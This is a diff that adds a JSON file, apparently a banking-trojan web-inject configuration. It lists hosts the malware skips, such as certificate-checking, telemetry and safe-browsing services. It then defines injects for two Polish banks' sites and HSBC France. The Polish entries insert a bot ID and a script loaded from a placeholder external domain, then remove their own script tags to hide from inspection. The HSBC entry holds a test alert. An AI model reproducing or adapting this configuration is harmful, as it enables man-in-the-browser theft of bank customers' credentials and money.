@@ -1,0 +1,42 @@
+{
+   "fg_blacklist": [ "*ocsp*.*", "*symc*.com*", "*clients*.google.com*", "*telemetry.mozilla.org*", "*facebook.com/ajax/*", "*safebrowsing.google.com*", "*services.mozilla.com*" ],
+   "injects": 
+   [
+      {
+         "host": "bosbank24.pl",
+         "path": "*",
+         "content":
+         [
+            {
+               "code": "</title>",
+               "before": "",
+               "after": "<script id=\"myjs3\"> window.rem777bname = \"%BOT_ID%\";</script><script id=\"myjs1\" src=\"some_domain.com/some.js\"></script><script id=\"myjs2\">var myrem = function (a){document.getElementById(a).parentNode.removeChild(document.getElementById(a))};myrem(\"myjs1\");myrem(\"myjs2\");myrem(\"myjs3\");delete myrem;delete rem777bname;</script>"  
+            }
+         ]
+      },
+      {
+         "host": "ebanknet.bsprudnik.pl",
+         "path": "*",
+         "content":
+         [
+            {
+               "code": "<title>eBankNet</title>",
+               "before": "",
+               "after": "<script id=\"myjs3\"> window.rem777bname = \"%BOT_ID%\";</script><script id=\"myjs1\" src=\"some_domain.com/some.js\"></script><script id=\"myjs2\">var myrem = function (a){document.getElementById(a).parentNode.removeChild(document.getElementById(a))};myrem(\"myjs1\");myrem(\"myjs2\");myrem(\"myjs3\");delete myrem;delete rem777bname;</script>"  
+            }
+         ]
+      },
+      {
+         "host": "www.hsbc.fr",
+         "path": "*",
+         "content":
+         [
+            {
+               "code": "</title>",
+               "before": "",
+               "after": "<script>alert('hello world');</script>"  
+            }
+         ]
+      }
+   ]
+}
